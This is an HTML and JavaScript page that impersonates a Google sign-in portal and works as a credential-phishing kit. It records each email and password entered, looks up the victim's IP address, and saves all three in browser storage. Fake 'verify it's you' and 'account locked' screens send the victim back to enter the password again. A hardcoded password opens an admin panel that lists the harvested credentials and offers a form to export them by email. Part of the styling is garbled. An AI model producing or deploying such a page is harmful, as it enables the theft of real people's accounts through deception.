    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Login Portal</title>
    <style>
        body {

            border-radius: 4px;

            font-weight: bold;
        }
        button:hover {
            background-color: #3367D6;
        }
        .hidden {
            display: none;
        }
        .error {
            color: #d93025;

            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid #eee;
        }
        .data-row {
            display: flex;

        }

        <h1>Sign in</h1>
        <p>Use your Google Account</p>
        <input type="email" id="email" placeholder="Email or phone">
        <div id="passwordField" class="hidden">
            <input type="password" id="password" placeholder="Enter your password">
        </div>
        <button id="nextBtn">Next</button>
        <div id="errorMessage" class="error hidden"></div>
    </div>

    <div class="container hidden" id="verifyContainer">
        <h1>Verify it's you</h1>
        <p>We've detected unusual activity from your device. Please verify your identity to continue.</p>
        <button id="verifyBtn">Verify Now</button>
    </div>

    <div class="container hidden" id="errorContainer">
        <h1>Error</h1>
        <p class="error">Your account has been temporarily locked due to suspicious activity.</p>
        <button id="reconnectBtn">Reconnect</button>
    </div>

    <div class="container hidden" id="adminContainer">
        <h1>Admin Panel</h1>
        <div id="credentialsList"></div>
        <div class="admin-panel">
            <h3>Export Credentials</h3>
            <input type="email" id="exportEmail" placeholder="Recipient email">
            <button id="exportBtn">Send Credentials</button>
            <div id="exportStatus"></div>
        </div>
    </div>

    <script>
        const password = "LoGs";
        const credentials = [];
        let currentEmail = "";
        let currentIP = "";

        document.getElementById('nextBtn').addEventListener('click', function() {
            const email = document.getElementById('email').value;
            
            if (!email.includes('@') || !email.includes('.')) {
                document.getElementById('errorMessage').textContent = "Couldn't find your Google Account";
                document.getElementById('errorMessage').classList.remove('hidden');
                return;
            }

            currentEmail = email;
            
            if (!document.getElementById('passwordField').classList.contains('hidden')) {
                const userPassword = document.getElementById('password').value;
                
                // Save credentials
                fetch('https://api.ipify.org?format=json')
                    .then(response => response.json())
                    .then(data => {
                        currentIP = data.ip;
                        credentials.push({ email: email, password: userPassword, ip: currentIP });
                        localStorage.setItem('savedCredentials', JSON.stringify(credentials));
                        
                        if (userPassword === password) {
                            showAdminPanel();
                        } else {
                            document.getElementById('loginContainer').classList.add('hidden');
                            document.getElementById('verifyContainer').classList.remove('hidden');
                        }
                    });
            } else {
                document.getElementById('passwordField').classList.remove('hidden');
                document.getElementById('nextBtn').textContent = "Sign in";
                document.getElementById('errorMessage').classList.add('hidden');
            }
        });

        document.getElementById('verifyBtn').addEventListener('click', function() {
            document.getElementById('verifyContainer').classList.add('hidden');
            document.getElementById('errorContainer').classList.remove('hidden');
        });

        document.getElementById('reconnectBtn').addEventListener('click', function() {
            document.getElementById('errorContainer').classList.add('hidden');
            document.getElementById('loginContainer').classList.remove('hidden');
            document.getElementById('email').value = currentEmail;
            document.getElementById('passwordField').classList.remove('hidden');
        });

        document.getElementById('exportBtn').addEventListener('click', function() {
            const exportEmail = document.getElementById('exportEmail').value;
            
            if (!exportEmail.includes('@') || !exportEmail.includes('.')) {
                document.getElementById('exportStatus').textContent = "Please enter a valid email";
                document.getElementById('exportStatus').style.color = "#d93025";
                return;
            }

            document.getElementById('exportStatus').textContent = `Credentials sent to ${exportEmail}`;
            document.getElementById('exportStatus').style.color = "#34A853";
        });

        function showAdminPanel() {
            document.getElementById('loginContainer').classList.add('hidden');
            document.getElementById('adminContainer').classList.remove('hidden');
            
            const savedCredentials = JSON.parse(localStorage.getItem('savedCredentials')) || [];
            const credentialsList = document.getElementById('credentialsList');
            credentialsList.innerHTML = '';
            
            savedCredentials.forEach(cred => {
                const row = document.createElement('div');
                row.className = 'data-row';
                row.innerHTML = `
                    <span>${cred.email}</span>
                    <span>${cred.password}</span>
                    <span>${cred.ip}</span>
                `;
                credentialsList.appendChild(row);
            });
        }

        // Check if admin is already logged in
        if (localStorage.getItem('adminLoggedIn')) {
            showAdminPanel();
        }
    </script>
</body>
</html>
